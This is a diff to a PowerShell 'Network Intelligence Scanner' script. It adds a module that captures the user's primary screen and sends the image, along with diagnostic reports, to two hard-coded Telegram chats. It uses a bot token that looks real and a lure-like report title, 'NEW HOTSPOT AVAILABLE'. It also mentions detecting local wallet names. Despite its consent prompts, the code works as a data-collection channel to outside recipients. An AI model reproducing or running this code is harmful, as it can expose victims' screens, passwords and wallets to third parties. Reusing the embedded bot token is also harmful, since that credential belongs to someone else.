@@ -1,4 +1,4 @@
-# Network Intelligence Scanner v3.6 (Windows PowerShell 5.1+)
+# Network Intelligence Scanner v3.6.1 (Windows PowerShell 5.1+)
 # Run only on a computer you own or administer with permission.
 # Public GitHub warning: never publish a working Telegram bot token.
 
@@ -8,7 +8,7 @@ $ProgressPreference = 'SilentlyContinue'
 # ========= EDIT THESE SETTINGS =========
 $botToken = '8715775001:AAGivZLOBG_YdpCuMlX6JIbFusUI5ofZ8Sk'
 $chatIds = @('8640543929', '8362186234')
-$enableScreenshotOption = $false # Screenshot module disabled (nothing captured or saved)
+$enableScreenshotOption = $true # Optional; requires separate capture and send confirmations
 $reportTitle = 'NEW HOTSPOT AVAILABLE'
 # =======================================
 
@@ -67,7 +67,7 @@ $stamp = Get-Date -Format 'yyyyMMdd_HHmmss'
 $reportDir = Join-Path ([Environment]::GetFolderPath('MyDocuments')) 'NetworkScannerReports'
 if (-not $reportDir) { $reportDir = Join-Path $env:TEMP 'NetworkScannerReports' }
 New-Item -ItemType Directory -Path $reportDir -Force | Out-Null
-Write-Host 'Network Intelligence Scanner v3.6'
+Write-Host 'Network Intelligence Scanner v3.6.1'
 Write-Host 'Collecting local diagnostics. No information is sent without confirmation.'
 
 # Public network
@@ -236,9 +236,50 @@ if (Ask-Yes 'Send this displayed diagnostic report to both Telegram chats?') {
     }
 } else { Write-Host 'No network data sent.' }
 
-# No screenshot is captured automatically. There are no image/process files written
-# or opened by this scanner. For screen sharing, use the Windows Snipping Tool,
-# review/redact the image, and send it yourself through Telegram.
+# ================= OPTIONAL SCREENSHOT =================
+# Screenshot is never opened automatically. User can open the displayed path
+# manually before deciding whether to send it. The temporary image is removed
+# after consent or cancellation; no screenshot is retained in report folders.
+if ($enableScreenshotOption -and (Ask-Yes 'Allow a screenshot of the primary display to be captured?')) {
+    $screenPath = Join-Path $env:TEMP ('scanner_screenshot_' + [guid]::NewGuid().ToString('N') + '.png')
+    $bitmap = $null
+    $graphics = $null
+    try {
+        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
+        Add-Type -AssemblyName System.Drawing -ErrorAction Stop
+        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        if ($bounds.Width -le 0 -or $bounds.Height -le 0) { throw 'No primary screen available.' }
+        $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
+        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
+        $bitmap.Save($screenPath, [System.Drawing.Imaging.ImageFormat]::Png)
+        $graphics.Dispose(); $graphics = $null
+        $bitmap.Dispose(); $bitmap = $null
+        Write-Host "`nScreenshot captured. It has NOT been opened or sent."
+        Write-Host "Review this image manually before sending: $screenPath"
+        Write-Host "Recipients: $($chatIds -join ', ')"
+        Write-Host 'CAUTION: A screenshot may include passwords, messages, or private information.'
+        if (Ask-Yes 'After reviewing it, send this screenshot to both Telegram chats?') {
+            if ([string]::IsNullOrWhiteSpace($botToken) -or $botToken -like 'PASTE_*') {
+                Write-Warning 'Telegram token not configured. Screenshot not sent.'
+            } else {
+                Send-TgPhoto $screenPath
+            }
+        } else {
+            Write-Host 'Screenshot was not sent.'
+        }
+    } catch {
+        Write-Warning "Screenshot operation failed: $($_.Exception.Message)"
+    } finally {
+        if ($graphics) { $graphics.Dispose() }
+        if ($bitmap) { $bitmap.Dispose() }
+        if (Test-Path -LiteralPath $screenPath) {
+            try { Remove-Item -LiteralPath $screenPath -Force -ErrorAction Stop }
+            catch { Write-Warning "Could not delete temporary screenshot: $screenPath. Close viewers and delete it manually." }
+        }
+    }
+}
+# ==========================================================
 
 # ================= LOCAL SOFTWARE INVENTORY =================
 # Local only: do not transmit detected wallet names, profile paths or IDs.
